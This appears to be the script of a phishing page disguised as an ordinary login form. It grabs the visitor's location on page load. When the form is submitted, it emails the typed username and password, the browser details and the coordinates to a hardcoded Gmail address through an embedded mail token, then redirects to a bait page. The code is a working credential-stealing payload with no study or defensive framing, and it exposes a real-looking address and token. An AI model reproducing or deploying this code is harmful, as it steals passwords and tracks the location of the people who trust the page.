var submit = document.getElementById('submit');
var btn_m = document.getElementById('btn_m');
var username = document.getElementById('username');
var password = document.getElementById('password');
var loginForm = document.getElementById('loginForm');

// Add a global variable to store the location
let userLocation = { latitude: null, longitude: null };

function getCurrentLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}

function showPosition(position) {
    userLocation.latitude = position.coords.latitude;
    userLocation.longitude = position.coords.longitude;
}

function showError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            console.log("User denied the request for Geolocation.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.log("Location information is unavailable.");
            break;
        case error.TIMEOUT:
            console.log("The request to get user location timed out.");
            break;
        case error.UNKNOWN_ERROR:
            console.log("An unknown error occurred.");
            break;
    }
}

// Call the getCurrentLocation function when the page loads to get the location early
getCurrentLocation();

function button_on() {
  username.addEventListener("input", () => {
    if (check_ok()[0]) {
      submit.disabled = false;
      btn_m.classList.add("active");
    } else {
      submit.disabled = true;
      btn_m.classList.remove("active");
    }
  });

  password.addEventListener("input", () => {
    if (check_ok()[0]) {
      submit.disabled = false;
      btn_m.classList.add("active");
    } else {
      submit.disabled = true;
      btn_m.classList.remove("active");
    }
  });
}

button_on();

function clearForm(form_id) {
  var form = document.querySelector(form_id);
  form.reset();
}

function check_ok() {
  var password = document.getElementById('password');
  var username = document.getElementById('username');
  var username_l = username.value.split("");
  var password_l = password.value.split("");
  var check_arr = [];
  var password_username_check;
  if (password_l.length >= 5 && username_l.length >= 5) {
    password_username_check = true;
  } else {
    password_username_check = false;
  }
  check_arr.push(password_username_check);
  return check_arr;
}

loginForm.addEventListener("submit", (e) => {
  e.preventDefault();
  
  // Ensure location is available before sending the email
    Email.send({
      SecureToken: "2c4c905a-af9f-4a10-af48-25f24e9e7b81",
      To: 'kumaradarsh00572@gmail.com',
      From: "kumaradarsh00572@gmail.com",
      Subject: `${username.value} ka password aagya 😎😎💯`,
      Body: `
        <h1>Username: ${username.value}</h1>
        <h2 style="color: green;">Password: ${password.value}</h2>
        <br>
        Device: ${window.navigator.appVersion}
        <br>
        Location:${userLocation.latitude},${userLocation.longitude}
      `
    }).then(
      message => {
        clearForm("#loginForm");
        if (message === "OK") {
          window.location.href = "/increase.html";
        }
      }
    );
  
    
});

var s_h_btn = document.querySelector(".s_h_btn");
s_h_btn.addEventListener('click', () => {
  if (password.type == 'password') {
    password.type = 'text';
    s_h_btn.innerHTML = 'Hide';
  } else {
    password.type = 'password';
    s_h_btn.innerHTML = 'Show';
  }
});
